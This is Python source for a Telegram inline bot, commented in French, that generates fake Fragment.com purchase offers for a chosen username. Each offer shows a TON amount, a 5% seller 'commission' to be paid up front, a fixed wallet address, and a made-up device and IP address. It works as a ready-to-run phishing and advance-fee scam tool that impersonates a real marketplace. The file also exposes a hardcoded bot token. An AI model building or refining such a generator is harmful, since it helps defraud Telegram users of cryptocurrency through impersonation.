import os
import time
import urllib.request
import json
import asyncio
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
import threading
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, MessageEntity, WebAppInfo
from telegram.ext import Application, InlineQueryHandler, ContextTypes

# Configuration
BOT_TOKEN = '7975400880:AAFMJ5ya_sMdLLMb7OjSbMYiBr3IhZikE6c'
PORT = int(os.getenv('PORT', 10000))
WEBHOOK_URL = "https://telegram-bot-vic3.onrender.com"
WEBAPP_URL = "https://myminiapp.onrender.com"  # 🔗 URL de votre site web

print(f"🤖 Inline Fragment Deal Generator v4.7")
print(f"🔑 Token: ✅")
print(f"🌐 Port: {PORT}")
print(f"🔗 Webhook: {WEBHOOK_URL}")
print(f"📱 Web App: {WEBAPP_URL}")

# Variables globales
app = None
event_loop = None

def get_ton_price():
    """Récupère le prix du TON en temps réel"""
    try:
        # API CoinGecko plus fiable
        url = "https://api.coingecko.com/api/v3/simple/price?ids=the-open-network&vs_currencies=usd"
        with urllib.request.urlopen(url, timeout=10) as response:
            data = json.loads(response.read().decode())
            price = float(data['the-open-network']['usd'])
            print(f"💰 Prix TON récupéré: ${price:.4f}")
            return price
    except Exception as e:
        print(f"❌ Erreur API CoinGecko: {e}")
        # Fallback vers DIA API
        try:
            url = "https://api.diadata.org/v1/assetQuotation/Ton/0x0000000000000000000000000000000000000000"
            with urllib.request.urlopen(url, timeout=5) as response:
                data = json.loads(response.read().decode())
                price = float(data.get('Price', 5.50))
                print(f"💰 Prix TON (fallback): ${price:.4f}")
                return price
        except Exception as e2:
            print(f"❌ Erreur API DIA: {e2}")
            # Prix par défaut si toutes les APIs échouent
            return 5.50

def generate_fragment_message(username, ton_amount):
    """Génère le message Fragment avec formatage identique au bot original"""
    try:
        print(f"🔧 DEBUG: Début génération pour {username} - {ton_amount} TON")
        
        # Prix TON actuel - récupération en temps réel
        ton_price = get_ton_price()
        print(f"🔧 DEBUG: Prix TON récupéré: {ton_price}")
        
        # Calculs
        price = float(ton_amount)
        price_usd = price * ton_price
        commission = price * 0.05
        commission_usd = commission * ton_price
        
        print(f"🔧 DEBUG: Calculs - Price: {price}, USD: {price_usd}, Commission: {commission}")
        
        # Adresse wallet
        wallet_address = "UQBBlxK8VBxEidbxw4oQVyLSk7iEf9VPJxetaRQpEbi-XDPR"
        
        # Message Fragment - Version simplifiée pour éviter les erreurs
        fragment_message = f"""We have received a purchase request for your username @{username} via Fragment.com. Below are the transaction details:

• Offer Amount: 💎{price:g} (${price_usd:.2f} USD)
• Commission: 💎{commission:g} (${commission_usd:.2f} USD)

Please note that a 5% commission is charged to the seller prior to accepting the deal. This ensures a secure and efficient transaction process.

Additional Information:
• Device: Safari on macOS  
• IP Address: 103.56.72.245
• Wallet: {wallet_address}

Important:
• Please proceed only if you are willing to transform your username into a collectible. This action is irreversible.
• If you choose not to proceed, simply ignore this message."""

        print(f"🔧 DEBUG: Message généré, longueur: {len(fragment_message)}")
        
        # Pas d'entités pour le moment - simplifié
        entities = []
        
        # Pas de clavier pour le moment - simplifié  
        keyboard = None
        
        print(f"✅ DEBUG: Message Fragment généré avec succès pour {username}")
        return fragment_message, entities, keyboard
        
    except Exception as e:
        print(f"❌ DEBUG: Erreur dans generate_fragment_message: {e}")
        import traceback
        print(f"❌ DEBUG: Traceback: {traceback.format_exc()}")
        raise e

async def inline_query_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Gestionnaire des requêtes inline"""
    print(f"🔍 DEBUG: inline_query_handler appelé")
    
    try:
        from telegram import InlineQueryResultArticle, InputTextMessageContent
        
        query = update.inline_query.query.strip() if update.inline_query.query else ""
        print(f"🔍 DEBUG: Requête reçue: '{query}'")
        
        # Si pas de requête - afficher un message d'aide
        if not query:
            print(f"🔍 DEBUG: Pas de query, envoi aide")
            results = [
                InlineQueryResultArticle(
                    id="help",
                    title="📝 Format: username montant",
                    description="Exemple: testuser 100",
                    input_message_content=InputTextMessageContent(
                        "ℹ️ Utilisez le format: @votre_bot username montant\nExemple: @votre_bot testuser 100"
                    )
                )
            ]
            await update.inline_query.answer(results, cache_time=0)
            print("📤 DEBUG: Aide envoyée avec succès")
            return
        
        # Parsing de la requête (username montant)
        parts = query.split()
        print(f"📝 DEBUG: Parties parsées: {parts}")
        
        # Si format incorrect - afficher un message d'aide
        if len(parts) < 2:
            print(f"🔍 DEBUG: Format incorrect, envoi erreur")
            results = [
                InlineQueryResultArticle(
                    id="error_format",
                    title="❌ Format incorrect",
                    description="Utilisez: username montant",
                    input_message_content=InputTextMessageContent(
                        f"❌ Format incorrect pour: '{query}'\n\n📝 Format attendu: username montant\nExemple: testuser 100"
                    )
                )
            ]
            await update.inline_query.answer(results, cache_time=0)
            print("📤 DEBUG: Erreur format envoyée avec succès")
            return
        
        username = parts[0].replace('@', '')  # Supprime @ si présent
        print(f"📝 DEBUG: Username extrait: '{username}'")
        
        try:
            ton_amount = float(parts[1])
            if ton_amount <= 0:
                raise ValueError("Montant doit être positif")
            print(f"📝 DEBUG: Montant validé: {ton_amount}")
        except ValueError as ve:
            print(f"📝 DEBUG: Erreur validation montant: {ve}")
            results = [
                InlineQueryResultArticle(
                    id="error_amount",
                    title="❌ Montant invalide",
                    description=f"'{parts[1]}' n'est pas un nombre valide",
                    input_message_content=InputTextMessageContent(
                        f"❌ Montant invalide: '{parts[1]}'\n\n💡 Le montant doit être un nombre positif\nExemple: 100 ou 50.5"
                    )
                )
            ]
            await update.inline_query.answer(results, cache_time=0)
            print("📤 DEBUG: Erreur montant envoyée avec succès")
            return
        
        print(f"✅ DEBUG: Paramètres validés: '{username}' - {ton_amount} TON")
        
        # ÉTAPE CRITIQUE - Génération du message
        print(f"🔧 DEBUG: Appel de generate_fragment_message...")
        try:
            fragment_message, entities, keyboard = generate_fragment_message(username, ton_amount)
            print(f"✅ DEBUG: generate_fragment_message terminé avec succès")
        except Exception as gen_error:
            print(f"❌ DEBUG: Erreur dans generate_fragment_message: {gen_error}")
            import traceback
            print(f"❌ DEBUG: Traceback génération: {traceback.format_exc()}")
            
            # Fallback avec message ultra simple
            results = [
                InlineQueryResultArticle(
                    id="error_generation",
                    title="❌ Erreur de génération",
                    description="Impossible de créer le message",
                    input_message_content=InputTextMessageContent(
                        f"❌ Erreur génération: {str(gen_error)}"
                    )
                )
            ]
            await update.inline_query.answer(results, cache_time=0)
            print("📤 DEBUG: Erreur génération envoyée")
            return
        
        # Prix pour affichage
        try:
            current_ton_price = get_ton_price()
            current_usd_value = ton_amount * current_ton_price
            print(f"💰 DEBUG: Prix final - {ton_amount} TON = ${current_usd_value:.2f}")
        except Exception as price_error:
            print(f"💰 DEBUG: Erreur prix: {price_error}")
            current_ton_price = 5.50
            current_usd_value = ton_amount * current_ton_price
        
        # ÉTAPE CRITIQUE - Création du résultat inline
        print(f"📤 DEBUG: Création du résultat inline...")
        try:
            result_id = f"deal_{username}_{ton_amount}_{int(time.time())}"
            print(f"📤 DEBUG: ID résultat: {result_id}")
            
            results = [
                InlineQueryResultArticle(
                    id=result_id,
                    title=f"Fragment Deal: @{username}",
                    description=f"💎 {ton_amount:g} TON (${current_usd_value:.2f} USD)",
                    input_message_content=InputTextMessageContent(
                        fragment_message,
                        entities=entities,
                        disable_web_page_preview=True
                    ),
                    reply_markup=keyboard
                )
            ]
            
            print(f"📤 DEBUG: Résultat créé, envoi en cours...")
            await update.inline_query.answer(results, cache_time=0)
            print(f"✅ DEBUG: Réponse inline envoyée avec succès: {username} - {ton_amount} TON")
        
        except Exception as result_error:
            print(f"❌ DEBUG: Erreur création résultat: {result_error}")
            import traceback
            print(f"❌ DEBUG: Traceback résultat: {traceback.format_exc()}")
            
            # Fallback ultra simple
            try:
                fallback_results = [
                    InlineQueryResultArticle(
                        id=f"simple_{username}_{ton_amount}",
                        title=f"Fragment Deal: @{username}",
                        description=f"💎 {ton_amount:g} TON",
                        input_message_content=InputTextMessageContent(
                            f"Fragment Deal Request\nUsername: @{username}\nAmount: 💎{ton_amount:g} TON"
                        )
                    )
                ]
                await update.inline_query.answer(fallback_results, cache_time=0)
                print("📤 DEBUG: Fallback simple envoyé avec succès")
            except Exception as fallback_error:
                print(f"❌ DEBUG: Même le fallback a échoué: {fallback_error}")
        
    except Exception as e:
        print(f"❌ DEBUG: Erreur critique dans inline_query_handler: {e}")
        import traceback
        print(f"❌ DEBUG: Traceback critique: {traceback.format_exc()}")

class WebhookHandler(BaseHTTPRequestHandler):
    """Gestionnaire webhook HTTP simple"""
    
    def do_POST(self):
        """Gestion des requêtes POST"""
        global app, event_loop
        
        try:
            if self.path != f'/{BOT_TOKEN}':
                self.send_response(404)
                self.end_headers()
                return
            
            # Lecture des données
            content_length = int(self.headers.get('content-length', 0))
            post_data = self.rfile.read(content_length)
            
            # Parse JSON
            update_data = json.loads(post_data.decode('utf-8'))
            
            # Traitement asynchrone
            if app and event_loop:
                asyncio.run_coroutine_threadsafe(
                    process_update(update_data),
                    event_loop
                )
            
            # Réponse OK
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(b'{"ok":true}')
            
        except Exception as e:
            print(f"❌ Erreur webhook: {e}")
            self.send_response(500)
            self.end_headers()
    
    def do_GET(self):
        """Page de status simple"""
        self.send_response(200)
        self.send_header('Content-Type', 'text/plain')
        self.end_headers()
        
        status = f"✅ Bot Status: Online\n🕐 Time: {time.strftime('%Y-%m-%d %H:%M:%S UTC')}\n📱 Web App: {WEBAPP_URL}"
        self.wfile.write(status.encode('utf-8'))
    
    def log_message(self, format, *args):
        """Désactiver les logs HTTP"""
        pass

async def process_update(update_data):
    """Traitement des updates Telegram"""
    global app
    
    try:
        if app:
            update = Update.de_json(update_data, app.bot)
            if update:
                await app.process_update(update)
    except Exception as e:
        print(f"❌ Erreur traitement update: {e}")

def run_webhook_server():
    """Démarre le serveur webhook"""
    try:
        server = HTTPServer(('0.0.0.0', PORT), WebhookHandler)
        print(f"🌐 Serveur webhook démarré sur le port {PORT}")
        server.serve_forever()
    except Exception as e:
        print(f"❌ Erreur serveur webhook: {e}")

async def setup_bot():
    """Configuration du bot"""
    global app, event_loop
    
    try:
        # Création de l'application
        app = Application.builder().token(BOT_TOKEN).build()
        
        # Ajout du gestionnaire inline
        app.add_handler(InlineQueryHandler(inline_query_handler))
        
        # Initialisation
        await app.initialize()
        await app.start()
        
        # Configuration du webhook
        webhook_url = f"{WEBHOOK_URL}/{BOT_TOKEN}"
        await app.bot.set_webhook(url=webhook_url)
        
        print(f"✅ Bot initialisé avec webhook: {webhook_url}")
        
        # Garde l'event loop actif
        event_loop = asyncio.get_event_loop()
        
        # Démarrage du serveur webhook dans un thread séparé
        webhook_thread = threading.Thread(target=run_webhook_server, daemon=True)
        webhook_thread.start()
        
        # Attente infinie
        while True:
            await asyncio.sleep(1)
            
    except Exception as e:
        print(f"❌ Erreur setup bot: {e}")
        raise

def main():
    """Fonction principale"""
    try:
        print("🚀 Démarrage du bot inline...")
        
        # Démarrage asynchrone
        asyncio.run(setup_bot())
        
    except KeyboardInterrupt:
        print("🛑 Arrêt du bot...")
    except Exception as e:
        print(f"❌ Erreur critique: {e}")

if __name__ == '__main__':
    main()
